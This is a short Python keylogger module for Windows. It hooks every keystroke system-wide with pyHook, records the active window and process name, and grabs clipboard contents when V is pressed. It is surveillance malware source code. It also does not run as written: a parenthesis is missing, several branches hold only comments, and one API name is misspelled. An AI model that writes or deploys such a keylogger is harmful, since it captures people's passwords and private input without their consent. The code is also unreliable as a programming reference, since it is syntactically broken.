#module to log key strokes, can log data after expiration or at intevals indefinately
#windows only
import pythoncom #library for com automation (windows)
import pyHook #library for windows input hooks
import win32clipboard
from ctypes import * #need to check if this works with dynamic import, may need to just import or use alias

user32 = windll.user32
kernel32 = windll.kernel32
psapi = windll.psapi
current_window = None

#print current foreground process details
def get_curr_proc():
	#handle to foreground window
	hwd = user32.GetForegroundWindow()

	#get pid of foreground window
	pid = c_ulong(0)
	user32.GetWindowThreadProcessId(hwd, byref(pid)

	proc_id = "%d" % pid.value

	#create buffer and get handle to executable
	exe = create_string_buffer("\x00" * 512)
	h_proc = kernel32.OpenProcess(0x400 | 0x10, False, pid)

	psapi.GetModuleBaseNameA(h_proc, None, byref(exe), 512)

	#get title of exe
	window_title = create_string_buffer("\x00" * 512)
	length = user32.GetWindowTestA(hwd, byref(window_title), 512)

	#print header
	#print proc_id, exe.value, window_title.value

	#close handles
	kernel32.CloseHandle(hwd)
	kernel32.CloseHandle(h_proc)

#callback on keystroke
def KeyStroke(event):
	global current_window

	#check if current window has changed
	if event.WindowName != current_window:
		current_window = event.WindowName
		get_curr_proc() #dont really need this, can just print event.WindowName

	if event.Ascii > 32 and event.Ascii < 127: #standard key
		#print chr(event.Ascii)
	else:
		#get clipboard if ctrl-v
		if event.Key == "V": #case?
			win32clipboard.OpenClipboard()
			pasted = win32clipboard.GetClipboardData()
			win32clipboard.CloseClipboard()

			#print pasted
		else:
			#print %s % event.Key #jusr print event.Key?

	return True #just execution to next hook

#main
#create and register hook manager
kl = pyHook.HookManager()
kl.KeyDown = KeyStroke

#register hook and execute forever
kl.HookKeyboard()
pythoncom.PumpMessages()
		
